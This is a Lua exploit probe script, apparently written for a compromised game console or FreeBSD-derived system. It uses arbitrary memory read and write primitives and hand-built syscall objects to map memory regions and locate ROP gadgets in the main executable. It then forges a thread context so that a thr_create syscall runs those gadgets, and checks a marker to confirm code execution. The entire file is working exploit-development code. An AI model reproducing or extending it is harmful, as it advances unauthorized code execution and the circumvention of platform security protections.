-- CRASH_CLASS: HIGH
-- PROBE 619a: does a thr_create child actually execute? verified gadgets, marker checked immediately
print("=== PROBE 619a: CHILD MARKER ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function raw(a) local o,v=pcall(function() return memory.read_byte(a) end) if o then return N(v) end return nil end
local function rawd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function rawq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local function hi(a) return math.floor((a or 0)/4294967296) end
local function lo(a) return math.floor((a or 0)%4294967296) end
local function hex(a) return string.format("%08X_%08X",hi(a),lo(a)) end

local sc674=mk(674)
local bufp=memory.alloc(0x20000)
local cnt=memory.alloc(4) wd(N(cnt),0)
pcall(function() sc674(U(N(bufp)),uint64(72),uint64(512),U(N(cnt)),uint64(0x40000000),uint64(0)) end)
local okc,cv=pcall(function() return memory.read_dword(N(cnt)) end)
local n=okc and N(cv) or 0
local RS,RE,RP={},{},{}
for i=0,n-1 do
    local b=N(bufp)+i*72
    RS[i+1]=N(rawq(b)); RE[i+1]=N(rawq(b+8)); RP[i+1]=N(rawd(b+0x18))
end
local eboot=nil
for k=1,n do
    if RP[k]==5 and RE[k]-RS[k]>0x92C6B then
        local s=RS[k]
        if raw(s+0x92C67)==0x48 and raw(s+0x92C68)==0x89 and raw(s+0x92C69)==0x07 and raw(s+0x92C6A)==0xC3 then eboot=s end
    end
end
print(string.format("[A] n=%d eboot=%s",n,hex(eboot or 0)))
if not eboot then print("[!] no eboot"); return end
local mover=eboot+0x92C67
print(string.format("[B] mover=%02X %02X %02X %02X",raw(mover),raw(mover+1),raw(mover+2),raw(mover+3)))

local spin=nil
for off=0x1000,0x60000 do
    local a=eboot+off
    if raw(a)==0xEB and raw(a+1)==0xFE then spin=a break end
end
print(string.format("[C] spin=%s bytes=%02X %02X",hex(spin or 0),spin and raw(spin) or 0,spin and raw(spin+1) or 0))
if not spin then print("[!] no spin"); return end

local sc430=mk(430)
local mark=memory.alloc(0x4000)
local ctx=memory.alloc(0x500)
local stack=memory.alloc(0x10000)
wq(N(mark),uint64(0x1111111111111111))
for i=0,0x4FC,4 do wd(N(ctx)+i,0) end
wq(N(ctx)+0x108,uint64(0x480))
wd(N(ctx)+0x0d0,0)
wq(N(ctx)+0x110,uint64(0x10000))
wq(N(ctx)+0x0c0,uint64(0x43))
wq(N(ctx)+0x100,uint64(0x3b))
wq(N(ctx)+0x0e0,U(mover))
wq(N(ctx)+0x0f8,U(N(stack)+0x10000-8))
wq(N(ctx)+0x078,U(0xCAFEBABE))
wq(N(ctx)+0x048,U(N(mark)))
wq(N(stack)+0x10000-8,U(spin))
local tid=memory.alloc(16) wq(N(tid),uint64(0))
local ok,rv=pcall(function() return sc430(U(N(ctx)),U(N(tid)),uint64(0)) end)
print(string.format("[D] thr_create ok=%s rv=%s",tostring(ok),tostring(ok and N(rv) or "err")))
local m=N(rawq(N(mark)))
print(string.format("[E] mark=%s",hex(m)))
for i=1,20000 do
    if N(rawq(N(mark)))~=0x1111111111111111 then break end
end
print(string.format("[F] mark=%s",hex(N(rawq(N(mark))))))
print("[Z] alive")
